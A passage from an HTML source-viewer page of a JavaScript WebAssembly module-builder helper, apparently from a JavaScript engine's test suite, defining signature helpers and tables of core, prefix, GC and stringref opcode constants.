class="line-number" value="311"></td><td class="line-content">  let kSig_v_rr = makeSig([kWasmExternRef, kWasmExternRef], []);</td></tr><tr><td class="line-number" value="312"></td><td class="line-content">  let kSig_v_aa = makeSig([kWasmAnyFunc, kWasmAnyFunc], []);</td></tr><tr><td class="line-number" value="313"></td><td class="line-content">  let kSig_r_v = makeSig([], [kWasmExternRef]);</td></tr><tr><td class="line-number" value="314"></td><td class="line-content">  let kSig_a_v = makeSig([], [kWasmAnyFunc]);</td></tr><tr><td class="line-number" value="315"></td><td class="line-content">  let kSig_a_i = makeSig([kWasmI32], [kWasmAnyFunc]);</td></tr><tr><td class="line-number" value="316"></td><td class="line-content">  let kSig_s_i = makeSig([kWasmI32], [kWasmS128]);</td></tr><tr><td class="line-number" value="317"></td><td class="line-content">  let kSig_i_s = makeSig([kWasmS128], [kWasmI32]);</td></tr><tr><td class="line-number" value="318"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="319"></td><td class="line-content">  function makeSig(params, results) {</td></tr><tr><td class="line-number" value="320"></td><td class="line-content">  return {params: params, results: results};</td></tr><tr><td class="line-number" value="321"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="322"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="323"></td><td class="line-content">  function makeSig_v_x(x) {</td></tr><tr><td class="line-number" value="324"></td><td class="line-content">  return makeSig([x], []);</td></tr><tr><td class="line-number" value="325"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="326"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="327"></td><td class="line-content">  function makeSig_x_v(x) {</td></tr><tr><td class="line-number" value="328"></td><td class="line-content">  return makeSig([], [x]);</td></tr><tr><td class="line-number" value="329"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="330"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="331"></td><td class="line-content">  function makeSig_v_xx(x) {</td></tr><tr><td class="line-number" value="332"></td><td class="line-content">  return makeSig([x, x], []);</td></tr><tr><td class="line-number" value="333"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="334"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="335"></td><td class="line-content">  function makeSig_r_v(r) {</td></tr><tr><td class="line-number" value="336"></td><td class="line-content">  return makeSig([], [r]);</td></tr><tr><td class="line-number" value="337"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="338"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="339"></td><td class="line-content">  function makeSig_r_x(r, x) {</td></tr><tr><td class="line-number" value="340"></td><td class="line-content">  return makeSig([x], [r]);</td></tr><tr><td class="line-number" value="341"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="342"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="343"></td><td class="line-content">  function makeSig_r_xx(r, x) {</td></tr><tr><td class="line-number" value="344"></td><td class="line-content">  return makeSig([x, x], [r]);</td></tr><tr><td class="line-number" value="345"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="346"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="347"></td><td class="line-content">  // Opcodes</td></tr><tr><td class="line-number" value="348"></td><td class="line-content">  const kWasmOpcodes = {</td></tr><tr><td class="line-number" value="349"></td><td class="line-content">  'Unreachable': 0x00,</td></tr><tr><td class="line-number" value="350"></td><td class="line-content">  'Nop': 0x01,</td></tr><tr><td class="line-number" value="351"></td><td class="line-content">  'Block': 0x02,</td></tr><tr><td class="line-number" value="352"></td><td class="line-content">  'Loop': 0x03,</td></tr><tr><td class="line-number" value="353"></td><td class="line-content">  'If': 0x04,</td></tr><tr><td class="line-number" value="354"></td><td class="line-content">  'Else': 0x05,</td></tr><tr><td class="line-number" value="355"></td><td class="line-content">  'Try': 0x06,</td></tr><tr><td class="line-number" value="356"></td><td class="line-content">  'TryTable': 0x1f,</td></tr><tr><td class="line-number" value="357"></td><td class="line-content">  'ThrowRef': 0x0a,</td></tr><tr><td class="line-number" value="358"></td><td class="line-content">  'Catch': 0x07,</td></tr><tr><td class="line-number" value="359"></td><td class="line-content">  'Throw': 0x08,</td></tr><tr><td class="line-number" value="360"></td><td class="line-content">  'Rethrow': 0x09,</td></tr><tr><td class="line-number" value="361"></td><td class="line-content">  'CatchAll': 0x19,</td></tr><tr><td class="line-number" value="362"></td><td class="line-content">  'End': 0x0b,</td></tr><tr><td class="line-number" value="363"></td><td class="line-content">  'Br': 0x0c,</td></tr><tr><td class="line-number" value="364"></td><td class="line-content">  'BrIf': 0x0d,</td></tr><tr><td class="line-number" value="365"></td><td class="line-content">  'BrTable': 0x0e,</td></tr><tr><td class="line-number" value="366"></td><td class="line-content">  'Return': 0x0f,</td></tr><tr><td class="line-number" value="367"></td><td class="line-content">  'CallFunction': 0x10,</td></tr><tr><td class="line-number" value="368"></td><td class="line-content">  'CallIndirect': 0x11,</td></tr><tr><td class="line-number" value="369"></td><td class="line-content">  'ReturnCall': 0x12,</td></tr><tr><td class="line-number" value="370"></td><td class="line-content">  'ReturnCallIndirect': 0x13,</td></tr><tr><td class="line-number" value="371"></td><td class="line-content">  'CallRef': 0x14,</td></tr><tr><td class="line-number" value="372"></td><td class="line-content">  'ReturnCallRef': 0x15,</td></tr><tr><td class="line-number" value="373"></td><td class="line-content">  'NopForTestingUnsupportedInLiftoff': 0x16,</td></tr><tr><td class="line-number" value="374"></td><td class="line-content">  'Delegate': 0x18,</td></tr><tr><td class="line-number" value="375"></td><td class="line-content">  'Drop': 0x1a,</td></tr><tr><td class="line-number" value="376"></td><td class="line-content">  'Select': 0x1b,</td></tr><tr><td class="line-number" value="377"></td><td class="line-content">  'SelectWithType': 0x1c,</td></tr><tr><td class="line-number" value="378"></td><td class="line-content">  'LocalGet': 0x20,</td></tr><tr><td class="line-number" value="379"></td><td class="line-content">  'LocalSet': 0x21,</td></tr><tr><td class="line-number" value="380"></td><td class="line-content">  'LocalTee': 0x22,</td></tr><tr><td class="line-number" value="381"></td><td class="line-content">  'GlobalGet': 0x23,</td></tr><tr><td class="line-number" value="382"></td><td class="line-content">  'GlobalSet': 0x24,</td></tr><tr><td class="line-number" value="383"></td><td class="line-content">  'TableGet': 0x25,</td></tr><tr><td class="line-number" value="384"></td><td class="line-content">  'TableSet': 0x26,</td></tr><tr><td class="line-number" value="385"></td><td class="line-content">  'I32LoadMem': 0x28,</td></tr><tr><td class="line-number" value="386"></td><td class="line-content">  'I64LoadMem': 0x29,</td></tr><tr><td class="line-number" value="387"></td><td class="line-content">  'F32LoadMem': 0x2a,</td></tr><tr><td class="line-number" value="388"></td><td class="line-content">  'F64LoadMem': 0x2b,</td></tr><tr><td class="line-number" value="389"></td><td class="line-content">  'I32LoadMem8S': 0x2c,</td></tr><tr><td class="line-number" value="390"></td><td class="line-content">  'I32LoadMem8U': 0x2d,</td></tr><tr><td class="line-number" value="391"></td><td class="line-content">  'I32LoadMem16S': 0x2e,</td></tr><tr><td class="line-number" value="392"></td><td class="line-content">  'I32LoadMem16U': 0x2f,</td></tr><tr><td class="line-number" value="393"></td><td class="line-content">  'I64LoadMem8S': 0x30,</td></tr><tr><td class="line-number" value="394"></td><td class="line-content">  'I64LoadMem8U': 0x31,</td></tr><tr><td class="line-number" value="395"></td><td class="line-content">  'I64LoadMem16S': 0x32,</td></tr><tr><td class="line-number" value="396"></td><td class="line-content">  'I64LoadMem16U': 0x33,</td></tr><tr><td class="line-number" value="397"></td><td class="line-content">  'I64LoadMem32S': 0x34,</td></tr><tr><td class="line-number" value="398"></td><td class="line-content">  'I64LoadMem32U': 0x35,</td></tr><tr><td class="line-number" value="399"></td><td class="line-content">  'I32StoreMem': 0x36,</td></tr><tr><td class="line-number" value="400"></td><td class="line-content">  'I64StoreMem': 0x37,</td></tr><tr><td class="line-number" value="401"></td><td class="line-content">  'F32StoreMem': 0x38,</td></tr><tr><td class="line-number" value="402"></td><td class="line-content">  'F64StoreMem': 0x39,</td></tr><tr><td class="line-number" value="403"></td><td class="line-content">  'I32StoreMem8': 0x3a,</td></tr><tr><td class="line-number" value="404"></td><td class="line-content">  'I32StoreMem16': 0x3b,</td></tr><tr><td class="line-number" value="405"></td><td class="line-content">  'I64StoreMem8': 0x3c,</td></tr><tr><td class="line-number" value="406"></td><td class="line-content">  'I64StoreMem16': 0x3d,</td></tr><tr><td class="line-number" value="407"></td><td class="line-content">  'I64StoreMem32': 0x3e,</td></tr><tr><td class="line-number" value="408"></td><td class="line-content">  'MemorySize': 0x3f,</td></tr><tr><td class="line-number" value="409"></td><td class="line-content">  'MemoryGrow': 0x40,</td></tr><tr><td class="line-number" value="410"></td><td class="line-content">  'I32Const': 0x41,</td></tr><tr><td class="line-number" value="411"></td><td class="line-content">  'I64Const': 0x42,</td></tr><tr><td class="line-number" value="412"></td><td class="line-content">  'F32Const': 0x43,</td></tr><tr><td class="line-number" value="413"></td><td class="line-content">  'F64Const': 0x44,</td></tr><tr><td class="line-number" value="414"></td><td class="line-content">  'I32Eqz': 0x45,</td></tr><tr><td class="line-number" value="415"></td><td class="line-content">  'I32Eq': 0x46,</td></tr><tr><td class="line-number" value="416"></td><td class="line-content">  'I32Ne': 0x47,</td></tr><tr><td class="line-number" value="417"></td><td class="line-content">  'I32LtS': 0x48,</td></tr><tr><td class="line-number" value="418"></td><td class="line-content">  'I32LtU': 0x49,</td></tr><tr><td class="line-number" value="419"></td><td class="line-content">  'I32GtS': 0x4a,</td></tr><tr><td class="line-number" value="420"></td><td class="line-content">  'I32GtU': 0x4b,</td></tr><tr><td class="line-number" value="421"></td><td class="line-content">  'I32LeS': 0x4c,</td></tr><tr><td class="line-number" value="422"></td><td class="line-content">  'I32LeU': 0x4d,</td></tr><tr><td class="line-number" value="423"></td><td class="line-content">  'I32GeS': 0x4e,</td></tr><tr><td class="line-number" value="424"></td><td class="line-content">  'I32GeU': 0x4f,</td></tr><tr><td class="line-number" value="425"></td><td class="line-content">  'I64Eqz': 0x50,</td></tr><tr><td class="line-number" value="426"></td><td class="line-content">  'I64Eq': 0x51,</td></tr><tr><td class="line-number" value="427"></td><td class="line-content">  'I64Ne': 0x52,</td></tr><tr><td class="line-number" value="428"></td><td class="line-content">  'I64LtS': 0x53,</td></tr><tr><td class="line-number" value="429"></td><td class="line-content">  'I64LtU': 0x54,</td></tr><tr><td class="line-number" value="430"></td><td class="line-content">  'I64GtS': 0x55,</td></tr><tr><td class="line-number" value="431"></td><td class="line-content">  'I64GtU': 0x56,</td></tr><tr><td class="line-number" value="432"></td><td class="line-content">  'I64LeS': 0x57,</td></tr><tr><td class="line-number" value="433"></td><td class="line-content">  'I64LeU': 0x58,</td></tr><tr><td class="line-number" value="434"></td><td class="line-content">  'I64GeS': 0x59,</td></tr><tr><td class="line-number" value="435"></td><td class="line-content">  'I64GeU': 0x5a,</td></tr><tr><td class="line-number" value="436"></td><td class="line-content">  'F32Eq': 0x5b,</td></tr><tr><td class="line-number" value="437"></td><td class="line-content">  'F32Ne': 0x5c,</td></tr><tr><td class="line-number" value="438"></td><td class="line-content">  'F32Lt': 0x5d,</td></tr><tr><td class="line-number" value="439"></td><td class="line-content">  'F32Gt': 0x5e,</td></tr><tr><td class="line-number" value="440"></td><td class="line-content">  'F32Le': 0x5f,</td></tr><tr><td class="line-number" value="441"></td><td class="line-content">  'F32Ge': 0x60,</td></tr><tr><td class="line-number" value="442"></td><td class="line-content">  'F64Eq': 0x61,</td></tr><tr><td class="line-number" value="443"></td><td class="line-content">  'F64Ne': 0x62,</td></tr><tr><td class="line-number" value="444"></td><td class="line-content">  'F64Lt': 0x63,</td></tr><tr><td class="line-number" value="445"></td><td class="line-content">  'F64Gt': 0x64,</td></tr><tr><td class="line-number" value="446"></td><td class="line-content">  'F64Le': 0x65,</td></tr><tr><td class="line-number" value="447"></td><td class="line-content">  'F64Ge': 0x66,</td></tr><tr><td class="line-number" value="448"></td><td class="line-content">  'I32Clz': 0x67,</td></tr><tr><td class="line-number" value="449"></td><td class="line-content">  'I32Ctz': 0x68,</td></tr><tr><td class="line-number" value="450"></td><td class="line-content">  'I32Popcnt': 0x69,</td></tr><tr><td class="line-number" value="451"></td><td class="line-content">  'I32Add': 0x6a,</td></tr><tr><td class="line-number" value="452"></td><td class="line-content">  'I32Sub': 0x6b,</td></tr><tr><td class="line-number" value="453"></td><td class="line-content">  'I32Mul': 0x6c,</td></tr><tr><td class="line-number" value="454"></td><td class="line-content">  'I32DivS': 0x6d,</td></tr><tr><td class="line-number" value="455"></td><td class="line-content">  'I32DivU': 0x6e,</td></tr><tr><td class="line-number" value="456"></td><td class="line-content">  'I32RemS': 0x6f,</td></tr><tr><td class="line-number" value="457"></td><td class="line-content">  'I32RemU': 0x70,</td></tr><tr><td class="line-number" value="458"></td><td class="line-content">  'I32And': 0x71,</td></tr><tr><td class="line-number" value="459"></td><td class="line-content">  'I32Ior': 0x72,</td></tr><tr><td class="line-number" value="460"></td><td class="line-content">  'I32Xor': 0x73,</td></tr><tr><td class="line-number" value="461"></td><td class="line-content">  'I32Shl': 0x74,</td></tr><tr><td class="line-number" value="462"></td><td class="line-content">  'I32ShrS': 0x75,</td></tr><tr><td class="line-number" value="463"></td><td class="line-content">  'I32ShrU': 0x76,</td></tr><tr><td class="line-number" value="464"></td><td class="line-content">  'I32Rol': 0x77,</td></tr><tr><td class="line-number" value="465"></td><td class="line-content">  'I32Ror': 0x78,</td></tr><tr><td class="line-number" value="466"></td><td class="line-content">  'I64Clz': 0x79,</td></tr><tr><td class="line-number" value="467"></td><td class="line-content">  'I64Ctz': 0x7a,</td></tr><tr><td class="line-number" value="468"></td><td class="line-content">  'I64Popcnt': 0x7b,</td></tr><tr><td class="line-number" value="469"></td><td class="line-content">  'I64Add': 0x7c,</td></tr><tr><td class="line-number" value="470"></td><td class="line-content">  'I64Sub': 0x7d,</td></tr><tr><td class="line-number" value="471"></td><td class="line-content">  'I64Mul': 0x7e,</td></tr><tr><td class="line-number" value="472"></td><td class="line-content">  'I64DivS': 0x7f,</td></tr><tr><td class="line-number" value="473"></td><td class="line-content">  'I64DivU': 0x80,</td></tr><tr><td class="line-number" value="474"></td><td class="line-content">  'I64RemS': 0x81,</td></tr><tr><td class="line-number" value="475"></td><td class="line-content">  'I64RemU': 0x82,</td></tr><tr><td class="line-number" value="476"></td><td class="line-content">  'I64And': 0x83,</td></tr><tr><td class="line-number" value="477"></td><td class="line-content">  'I64Ior': 0x84,</td></tr><tr><td class="line-number" value="478"></td><td class="line-content">  'I64Xor': 0x85,</td></tr><tr><td class="line-number" value="479"></td><td class="line-content">  'I64Shl': 0x86,</td></tr><tr><td class="line-number" value="480"></td><td class="line-content">  'I64ShrS': 0x87,</td></tr><tr><td class="line-number" value="481"></td><td class="line-content">  'I64ShrU': 0x88,</td></tr><tr><td class="line-number" value="482"></td><td class="line-content">  'I64Rol': 0x89,</td></tr><tr><td class="line-number" value="483"></td><td class="line-content">  'I64Ror': 0x8a,</td></tr><tr><td class="line-number" value="484"></td><td class="line-content">  'F32Abs': 0x8b,</td></tr><tr><td class="line-number" value="485"></td><td class="line-content">  'F32Neg': 0x8c,</td></tr><tr><td class="line-number" value="486"></td><td class="line-content">  'F32Ceil': 0x8d,</td></tr><tr><td class="line-number" value="487"></td><td class="line-content">  'F32Floor': 0x8e,</td></tr><tr><td class="line-number" value="488"></td><td class="line-content">  'F32Trunc': 0x8f,</td></tr><tr><td class="line-number" value="489"></td><td class="line-content">  'F32NearestInt': 0x90,</td></tr><tr><td class="line-number" value="490"></td><td class="line-content">  'F32Sqrt': 0x91,</td></tr><tr><td class="line-number" value="491"></td><td class="line-content">  'F32Add': 0x92,</td></tr><tr><td class="line-number" value="492"></td><td class="line-content">  'F32Sub': 0x93,</td></tr><tr><td class="line-number" value="493"></td><td class="line-content">  'F32Mul': 0x94,</td></tr><tr><td class="line-number" value="494"></td><td class="line-content">  'F32Div': 0x95,</td></tr><tr><td class="line-number" value="495"></td><td class="line-content">  'F32Min': 0x96,</td></tr><tr><td class="line-number" value="496"></td><td class="line-content">  'F32Max': 0x97,</td></tr><tr><td class="line-number" value="497"></td><td class="line-content">  'F32CopySign': 0x98,</td></tr><tr><td class="line-number" value="498"></td><td class="line-content">  'F64Abs': 0x99,</td></tr><tr><td class="line-number" value="499"></td><td class="line-content">  'F64Neg': 0x9a,</td></tr><tr><td class="line-number" value="500"></td><td class="line-content">  'F64Ceil': 0x9b,</td></tr><tr><td class="line-number" value="501"></td><td class="line-content">  'F64Floor': 0x9c,</td></tr><tr><td class="line-number" value="502"></td><td class="line-content">  'F64Trunc': 0x9d,</td></tr><tr><td class="line-number" value="503"></td><td class="line-content">  'F64NearestInt': 0x9e,</td></tr><tr><td class="line-number" value="504"></td><td class="line-content">  'F64Sqrt': 0x9f,</td></tr><tr><td class="line-number" value="505"></td><td class="line-content">  'F64Add': 0xa0,</td></tr><tr><td class="line-number" value="506"></td><td class="line-content">  'F64Sub': 0xa1,</td></tr><tr><td class="line-number" value="507"></td><td class="line-content">  'F64Mul': 0xa2,</td></tr><tr><td class="line-number" value="508"></td><td class="line-content">  'F64Div': 0xa3,</td></tr><tr><td class="line-number" value="509"></td><td class="line-content">  'F64Min': 0xa4,</td></tr><tr><td class="line-number" value="510"></td><td class="line-content">  'F64Max': 0xa5,</td></tr><tr><td class="line-number" value="511"></td><td class="line-content">  'F64CopySign': 0xa6,</td></tr><tr><td class="line-number" value="512"></td><td class="line-content">  'I32ConvertI64': 0xa7,</td></tr><tr><td class="line-number" value="513"></td><td class="line-content">  'I32SConvertF32': 0xa8,</td></tr><tr><td class="line-number" value="514"></td><td class="line-content">  'I32UConvertF32': 0xa9,</td></tr><tr><td class="line-number" value="515"></td><td class="line-content">  'I32SConvertF64': 0xaa,</td></tr><tr><td class="line-number" value="516"></td><td class="line-content">  'I32UConvertF64': 0xab,</td></tr><tr><td class="line-number" value="517"></td><td class="line-content">  'I64SConvertI32': 0xac,</td></tr><tr><td class="line-number" value="518"></td><td class="line-content">  'I64UConvertI32': 0xad,</td></tr><tr><td class="line-number" value="519"></td><td class="line-content">  'I64SConvertF32': 0xae,</td></tr><tr><td class="line-number" value="520"></td><td class="line-content">  'I64UConvertF32': 0xaf,</td></tr><tr><td class="line-number" value="521"></td><td class="line-content">  'I64SConvertF64': 0xb0,</td></tr><tr><td class="line-number" value="522"></td><td class="line-content">  'I64UConvertF64': 0xb1,</td></tr><tr><td class="line-number" value="523"></td><td class="line-content">  'F32SConvertI32': 0xb2,</td></tr><tr><td class="line-number" value="524"></td><td class="line-content">  'F32UConvertI32': 0xb3,</td></tr><tr><td class="line-number" value="525"></td><td class="line-content">  'F32SConvertI64': 0xb4,</td></tr><tr><td class="line-number" value="526"></td><td class="line-content">  'F32UConvertI64': 0xb5,</td></tr><tr><td class="line-number" value="527"></td><td class="line-content">  'F32ConvertF64': 0xb6,</td></tr><tr><td class="line-number" value="528"></td><td class="line-content">  'F64SConvertI32': 0xb7,</td></tr><tr><td class="line-number" value="529"></td><td class="line-content">  'F64UConvertI32': 0xb8,</td></tr><tr><td class="line-number" value="530"></td><td class="line-content">  'F64SConvertI64': 0xb9,</td></tr><tr><td class="line-number" value="531"></td><td class="line-content">  'F64UConvertI64': 0xba,</td></tr><tr><td class="line-number" value="532"></td><td class="line-content">  'F64ConvertF32': 0xbb,</td></tr><tr><td class="line-number" value="533"></td><td class="line-content">  'I32ReinterpretF32': 0xbc,</td></tr><tr><td class="line-number" value="534"></td><td class="line-content">  'I64ReinterpretF64': 0xbd,</td></tr><tr><td class="line-number" value="535"></td><td class="line-content">  'F32ReinterpretI32': 0xbe,</td></tr><tr><td class="line-number" value="536"></td><td class="line-content">  'F64ReinterpretI64': 0xbf,</td></tr><tr><td class="line-number" value="537"></td><td class="line-content">  'I32SExtendI8': 0xc0,</td></tr><tr><td class="line-number" value="538"></td><td class="line-content">  'I32SExtendI16': 0xc1,</td></tr><tr><td class="line-number" value="539"></td><td class="line-content">  'I64SExtendI8': 0xc2,</td></tr><tr><td class="line-number" value="540"></td><td class="line-content">  'I64SExtendI16': 0xc3,</td></tr><tr><td class="line-number" value="541"></td><td class="line-content">  'I64SExtendI32': 0xc4,</td></tr><tr><td class="line-number" value="542"></td><td class="line-content">  'RefNull': 0xd0,</td></tr><tr><td class="line-number" value="543"></td><td class="line-content">  'RefIsNull': 0xd1,</td></tr><tr><td class="line-number" value="544"></td><td class="line-content">  'RefFunc': 0xd2,</td></tr><tr><td class="line-number" value="545"></td><td class="line-content">  'RefEq': 0xd3,</td></tr><tr><td class="line-number" value="546"></td><td class="line-content">  'RefAsNonNull': 0xd4,</td></tr><tr><td class="line-number" value="547"></td><td class="line-content">  'BrOnNull': 0xd5,</td></tr><tr><td class="line-number" value="548"></td><td class="line-content">  'BrOnNonNull': 0xd6</td></tr><tr><td class="line-number" value="549"></td><td class="line-content">  };</td></tr><tr><td class="line-number" value="550"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="551"></td><td class="line-content">  function defineWasmOpcode(name, value) {</td></tr><tr><td class="line-number" value="552"></td><td class="line-content">  if (globalThis.kWasmOpcodeNames === undefined) {</td></tr><tr><td class="line-number" value="553"></td><td class="line-content">    globalThis.kWasmOpcodeNames = {};</td></tr><tr><td class="line-number" value="554"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="555"></td><td class="line-content">  Object.defineProperty(globalThis, name, {value: value});</td></tr><tr><td class="line-number" value="556"></td><td class="line-content">  if (globalThis.kWasmOpcodeNames[value] !== undefined) {</td></tr><tr><td class="line-number" value="557"></td><td class="line-content">    throw new Error(`Duplicate wasm opcode: ${value}. Previous name: ${</td></tr><tr><td class="line-number" value="558"></td><td class="line-content">        globalThis.kWasmOpcodeNames[value]}, new name: ${name}`);</td></tr><tr><td class="line-number" value="559"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="560"></td><td class="line-content">  globalThis.kWasmOpcodeNames[value] = name;</td></tr><tr><td class="line-number" value="561"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="562"></td><td class="line-content">  for (let name in kWasmOpcodes) {</td></tr><tr><td class="line-number" value="563"></td><td class="line-content">  defineWasmOpcode(`kExpr${name}`, kWasmOpcodes[name]);</td></tr><tr><td class="line-number" value="564"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="565"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="566"></td><td class="line-content">  // Prefix opcodes</td></tr><tr><td class="line-number" value="567"></td><td class="line-content">  const kPrefixOpcodes = {</td></tr><tr><td class="line-number" value="568"></td><td class="line-content">  'GC': 0xfb,</td></tr><tr><td class="line-number" value="569"></td><td class="line-content">  'Numeric': 0xfc,</td></tr><tr><td class="line-number" value="570"></td><td class="line-content">  'Simd': 0xfd,</td></tr><tr><td class="line-number" value="571"></td><td class="line-content">  'Atomic': 0xfe</td></tr><tr><td class="line-number" value="572"></td><td class="line-content">  };</td></tr><tr><td class="line-number" value="573"></td><td class="line-content">  for (let prefix in kPrefixOpcodes) {</td></tr><tr><td class="line-number" value="574"></td><td class="line-content">  defineWasmOpcode(`k${prefix}Prefix`, kPrefixOpcodes[prefix]);</td></tr><tr><td class="line-number" value="575"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="576"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="577"></td><td class="line-content">  // Use these for multi-byte instructions (opcode &gt; 0x7F needing two LEB bytes):</td></tr><tr><td class="line-number" value="578"></td><td class="line-content">  function SimdInstr(opcode) {</td></tr><tr><td class="line-number" value="579"></td><td class="line-content">  if (opcode &lt;= 0x7F) return [kSimdPrefix, opcode];</td></tr><tr><td class="line-number" value="580"></td><td class="line-content">  return [kSimdPrefix, 0x80 | (opcode &amp; 0x7F), opcode &gt;&gt; 7];</td></tr><tr><td class="line-number" value="581"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="582"></td><td class="line-content">  function GCInstr(opcode) {</td></tr><tr><td class="line-number" value="583"></td><td class="line-content">  if (opcode &lt;= 0x7F) return [kGCPrefix, opcode];</td></tr><tr><td class="line-number" value="584"></td><td class="line-content">  return [kGCPrefix, 0x80 | (opcode &amp; 0x7F), opcode &gt;&gt; 7];</td></tr><tr><td class="line-number" value="585"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="586"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="587"></td><td class="line-content">  // GC opcodes</td></tr><tr><td class="line-number" value="588"></td><td class="line-content">  let kExprStructNew = 0x00;</td></tr><tr><td class="line-number" value="589"></td><td class="line-content">  let kExprStructNewDefault = 0x01;</td></tr><tr><td class="line-number" value="590"></td><td class="line-content">  let kExprStructGet = 0x02;</td></tr><tr><td class="line-number" value="591"></td><td class="line-content">  let kExprStructGetS = 0x03;</td></tr><tr><td class="line-number" value="592"></td><td class="line-content">  let kExprStructGetU = 0x04;</td></tr><tr><td class="line-number" value="593"></td><td class="line-content">  let kExprStructSet = 0x05;</td></tr><tr><td class="line-number" value="594"></td><td class="line-content">  let kExprArrayNew = 0x06;</td></tr><tr><td class="line-number" value="595"></td><td class="line-content">  let kExprArrayNewDefault = 0x07;</td></tr><tr><td class="line-number" value="596"></td><td class="line-content">  let kExprArrayNewFixed = 0x08;</td></tr><tr><td class="line-number" value="597"></td><td class="line-content">  let kExprArrayNewData = 0x09;</td></tr><tr><td class="line-number" value="598"></td><td class="line-content">  let kExprArrayNewElem = 0x0a;</td></tr><tr><td class="line-number" value="599"></td><td class="line-content">  let kExprArrayGet = 0x0b;</td></tr><tr><td class="line-number" value="600"></td><td class="line-content">  let kExprArrayGetS = 0x0c;</td></tr><tr><td class="line-number" value="601"></td><td class="line-content">  let kExprArrayGetU = 0x0d;</td></tr><tr><td class="line-number" value="602"></td><td class="line-content">  let kExprArraySet = 0x0e;</td></tr><tr><td class="line-number" value="603"></td><td class="line-content">  let kExprArrayLen = 0x0f;</td></tr><tr><td class="line-number" value="604"></td><td class="line-content">  let kExprArrayFill = 0x10;</td></tr><tr><td class="line-number" value="605"></td><td class="line-content">  let kExprArrayCopy = 0x11;</td></tr><tr><td class="line-number" value="606"></td><td class="line-content">  let kExprArrayInitData = 0x12;</td></tr><tr><td class="line-number" value="607"></td><td class="line-content">  let kExprArrayInitElem = 0x13;</td></tr><tr><td class="line-number" value="608"></td><td class="line-content">  let kExprRefTest = 0x14;</td></tr><tr><td class="line-number" value="609"></td><td class="line-content">  let kExprRefTestNull = 0x15;</td></tr><tr><td class="line-number" value="610"></td><td class="line-content">  let kExprRefCast = 0x16;</td></tr><tr><td class="line-number" value="611"></td><td class="line-content">  let kExprRefCastNull = 0x17;</td></tr><tr><td class="line-number" value="612"></td><td class="line-content">  let kExprBrOnCastGeneric = 0x18;      // TODO(14034): Drop "Generic" name.</td></tr><tr><td class="line-number" value="613"></td><td class="line-content">  let kExprBrOnCastFailGeneric = 0x19;  // TODO(14034): Drop "Generic" name.</td></tr><tr><td class="line-number" value="614"></td><td class="line-content">  let kExprAnyConvertExtern = 0x1a;</td></tr><tr><td class="line-number" value="615"></td><td class="line-content">  let kExprExternConvertAny = 0x1b;</td></tr><tr><td class="line-number" value="616"></td><td class="line-content">  let kExprRefI31 = 0x1c;</td></tr><tr><td class="line-number" value="617"></td><td class="line-content">  let kExprI31GetS = 0x1d;</td></tr><tr><td class="line-number" value="618"></td><td class="line-content">  let kExprI31GetU = 0x1e;</td></tr><tr><td class="line-number" value="619"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="620"></td><td class="line-content">  let kExprRefCastNop = 0x4c;</td></tr><tr><td class="line-number" value="621"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="622"></td><td class="line-content">  // Stringref proposal.</td></tr><tr><td class="line-number" value="623"></td><td class="line-content">  let kExprStringNewUtf8 = 0x80;</td></tr><tr><td class="line-number" value="624"></td><td class="line-content">  let kExprStringNewWtf16 = 0x81;</td></tr><tr><td class="line-number" value="625"></td><td class="line-content">  let kExprStringConst = 0x82;</td></tr><tr><td class="line-number" value="626"></td><td class="line-content">  let kExprStringMeasureUtf8 = 0x83;</td></tr><tr><td class="line-number" value="627"></td><td class="line-content">  let kExprStringMeasureWtf8 = 0x84;</td></tr><tr><td class="line-number" value="628"></td><td class="line-content">  let kExprStringMeasureWtf16 = 0x85;</td></tr><tr><td class="line-number" value="629"></td><td class="line-content">  let kExprStringEncodeUtf8 = 0x86;</td></tr><tr><td class="line-number" value="630"></td><td class="line-content">  let kExprStringEncodeWtf16 = 0x87;</td></tr><tr><td class="line-number" value="631"></td><td class="line-content">  let kExprStringConcat = 0x88;</td></tr><tr><td class="line-number" value="632"></td><td class="line-content">  let kExprStringEq = 0x89;</td></tr><tr><td class="line-number" value="633"></td><td class="line-content">  let kExprStringIsUsvSequence = 0x8a;</td></tr><tr><td class="line-number" value="634"></td><td class="line-content">  let kExprStringNewLossyUtf8 = 0x8b;</td></tr><tr><td class="line-number" value="635"></td><td class="line-content">  let kExprStringNewWtf8 = 0x8c;</td></tr><tr><td class="line-number" value="636"></td><td class="line-content">  let kExprStringEncodeLossyUtf8 = 0x8d;</td></tr><tr><td class="line-number" value="637"></td><td class="line-content">  let kExprStringEncodeWtf8 = 0x8e;</td></tr><tr><td class="line-number" value="638"></td><td class="line-content">  let kExprStringNewUtf8Try = 0x8f;</td></tr><tr><td class="line-number" value="639"></td><td class="line-content">  let kExprStringAsWtf8 = 0x90;</td></tr><tr><td class="line-number" value="640"></td><td class="line-content">  let kExprStringViewWtf8Advance = 0x91;</td></tr><tr><td class="line-number" value="641"></td><td class="line-content">  let kExprStringViewWtf8EncodeUtf8 = 0x92;</td></tr><tr><td class="line-number" value="642"></td><td class="line-content">  let kExprStringViewWtf8Slice = 0x93;</td></tr><tr><td class="line-number" value="643"></td><td class="line-content">  let kExprStringViewWtf8EncodeLossyUtf8 = 